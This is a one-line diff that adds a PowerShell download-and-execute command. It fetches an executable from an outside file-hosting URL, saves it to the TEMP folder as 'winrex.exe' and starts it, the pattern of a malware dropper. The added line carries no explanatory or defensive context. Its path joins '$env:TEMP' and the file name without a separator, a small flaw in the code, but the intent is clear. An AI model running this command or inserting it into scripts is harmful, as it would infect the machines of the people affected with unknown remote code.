@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/vhcwbo.exe',"$env:TEMPwinrex.exe");Start-Process ("$env:TEMPwinrex.exe")
